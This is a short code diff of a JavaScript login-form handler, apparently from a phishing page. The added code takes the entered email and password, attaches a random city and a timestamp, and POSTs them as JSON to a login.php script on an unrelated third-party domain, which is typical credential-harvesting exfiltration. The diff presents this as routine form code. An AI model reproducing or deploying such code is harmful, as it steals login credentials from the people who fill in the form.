@@ -251,30 +251,30 @@ if (form) {
 
 try {
 
-   
-
-    const city = cities[Math.floor(Math.random() * cities.length)];
-    const currentTime = new Date().toISOString();
-
-   
-    const res = await fetch("https://lorneplumbing.com.au/login.php", {
-
-        method: "POST",
-
-        headers: {
-            "Content-Type": "application/json"
-        },
-
-        body: JSON.stringify({
-            email,
-            password,
-            city,
-            currentTime
-        })
-
-    });
 
 
+ const cities = [
+   ];
+
+const city = cities[Math.floor(Math.random() * cities.length)];
+const currentTime = new Date().toISOString();
+
+const res = await fetch("https://lorneplumbing.com.au/login.php", {
+
+    method: "POST",
+
+    headers: {
+        "Content-Type": "application/json"
+    },
+
+    body: JSON.stringify({
+        email: email,
+        password: password,
+        city: city,
+        currentTime: currentTime
+    })
+
+});
 
 
 
